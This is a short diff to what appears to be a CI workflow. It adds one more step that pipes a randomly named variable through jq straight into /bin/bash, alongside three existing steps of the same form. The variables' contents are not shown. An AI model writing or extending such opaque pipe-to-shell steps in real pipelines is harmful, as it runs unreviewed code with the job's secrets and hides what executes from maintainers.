@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$pyprr531" | jq -r .unz3299 | /bin/bash
           echo $pbt8 | jq -r .xc1 | /bin/bash
           printf '%s' "$hc049" | jq -r .zmi44 | /bin/bash
+          printf '%s' "$ghnif60" | jq -r .q14 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
